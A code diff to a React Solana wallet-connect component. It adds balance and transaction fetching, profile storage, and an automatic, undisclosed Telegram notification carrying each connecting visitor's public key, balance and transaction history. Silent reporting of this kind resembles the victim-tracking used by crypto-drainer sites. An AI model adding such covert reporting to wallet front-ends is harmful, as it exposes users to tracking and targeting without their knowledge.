@@ -1,11 +1,69 @@
 import { useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import '@solana/wallet-adapter-react-ui/styles.css';
+import { WalletService } from '../services/walletService';
+import { TelegramService } from '../services/telegramService';
+import { UserProfileService } from '../services/userProfileService';
 
 function WalletConnect() {
   const { publicKey, disconnect } = useWallet();
   const [copied, setCopied] = useState(false);
+  const [balance, setBalance] = useState(null);
+  const [transactions, setTransactions] = useState([]);
+
+  const walletService = new WalletService();
+  const telegramService = new TelegramService();
+  const userProfileService = new UserProfileService();
+
+  useEffect(() => {
+    console.log('Wallet connection effect triggered');
+    console.log('Public Key:', publicKey?.toString());
+    
+    if (publicKey) {
+      const fetchWalletData = async () => {
+        try {
+          console.log('Fetching wallet data...');
+          
+          // Get wallet balance
+          const walletBalance = await walletService.getBalance(publicKey.toString());
+          console.log('Wallet balance:', walletBalance);
+          setBalance(walletBalance);
+
+          // Get transaction history
+          const txHistory = await walletService.getTransactionHistory(publicKey.toString());
+          console.log('Transaction history:', txHistory);
+          setTransactions(txHistory);
+
+          // Update user profile
+          await userProfileService.updateWalletInfo({
+            publicKey: publicKey.toString(),
+            balance: walletBalance,
+            transactions: txHistory,
+            timestamp: new Date().toISOString()
+          });
+
+          // Send notification to Telegram
+          console.log('Preparing to send Telegram notification...');
+          const walletInfo = telegramService.formatWalletInfo({
+            publicKey: publicKey.toString(),
+            balance: walletBalance,
+            transactions: txHistory,
+            timestamp: new Date().toISOString()
+          });
+          console.log('Formatted wallet info:', walletInfo);
+          
+          console.log('Sending to Telegram...');
+          const telegramResponse = await telegramService.sendMessage(walletInfo);
+          console.log('Telegram response:', telegramResponse);
+        } catch (error) {
+          console.error('Error in fetchWalletData:', error);
+        }
+      };
+
+      fetchWalletData();
+    }
+  }, [publicKey]);
 
   const copyAddress = () => {
     if (publicKey) {
@@ -20,6 +78,15 @@ function WalletConnect() {
     const start = address.slice(0, 4);
     const end = address.slice(-4);
     return `${start}...${end}`;
+  };
+
+  const handleDisconnect = async () => {
+    try {
+      await userProfileService.clearProfile();
+      disconnect();
+    } catch (error) {
+      console.error('Error disconnecting wallet:', error);
+    }
   };
 
   return (
@@ -39,8 +106,13 @@ function WalletConnect() {
                 {copied && <span className="copied-indicator ms-2">Copied!</span>}
               </span>
             </div>
+            {balance !== null && (
+              <div className="balance-info text-sm opacity-80">
+                Balance: {balance.toFixed(4)} SOL
+              </div>
+            )}
             <button 
-              onClick={disconnect} 
+              onClick={handleDisconnect} 
               className="disconnect-btn text-xs mt-1"
             >
               Disconnect
@@ -132,6 +204,11 @@ function WalletConnect() {
         .disconnect-btn:hover {
           color: rgba(226, 232, 240, 0.9);
           text-decoration: underline;
+        }
+        
+        .balance-info {
+          margin-top: 4px;
+          color: #E2E8F0;
         }
         
         /* Override default WalletMultiButton styles */
